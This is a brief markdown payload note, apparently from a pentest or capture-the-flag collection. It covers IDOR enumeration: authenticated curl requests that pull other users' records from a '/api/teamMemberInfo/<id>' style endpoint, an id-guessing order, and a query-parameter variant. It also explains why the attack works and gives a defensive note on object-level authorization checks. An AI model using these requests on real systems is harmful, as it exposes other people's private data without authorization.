# Team Member Info ID Enumeration

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- login yields a valid authenticated session
- the primary profile endpoint derives identity from session and rejects id tampering
- JavaScript, docs, or recon reveal a secondary endpoint shaped like `/api/teamMemberInfo/<id>`
- the response includes user-specific fields such as `email`, `secret`, `salary`, or `notes`

## Minimal Payload

Authenticated request with another user's numeric id:

```bash
curl -sS -b cookies.txt 'https://[host]/api/teamMemberInfo/1'
```

## Enumeration Order

Start with ids hinted in the UI, then expand carefully:

```text
1   # often admin or first user in announcements
self_id
self_id - 1
self_id + 1
2, 3, 4 ...
```

## Control Requests

Session-bound profile:

```bash
curl -sS -b cookies.txt 'https://[host]/api/me'
```

Own id on the alternate endpoint:

```bash
curl -sS -b cookies.txt 'https://[host]/api/teamMemberInfo/[self_id]'
```

## Why It Works

The alternate endpoint authenticates the caller but authorizes access using only the path id, without verifying that the requested object belongs to the signed-in user.

## Why It Fails

- The endpoint ignores the path id and uses session identity.
- The server returns only public fields for non-owners.
- The endpoint requires admin role in addition to authentication.
- Invalid ids and unauthorized ids are indistinguishable, blocking reliable enumeration.

## Common Mistakes

- Stopping after `/api/me` works and session tampering fails.
- Missing dormant JavaScript that documents unused APIs.
- Brute-forcing large id ranges before checking UI hints like `(#1, admin)`.
- Storing live flags or target-specific secrets in reusable payload files.

## Defensive Note

Authentication and object-level authorization are separate controls. Every endpoint that accepts an object id needs an explicit ownership or role check.

## Related Variant

Query-param form (Acme esbuild + source map instances):

```bash
curl -sS -b cookies.txt \
  'https://[host]/api/v1/admin/profile?principal=1'
```

See `payloads/idor/admin-profile-principal-query.md`.
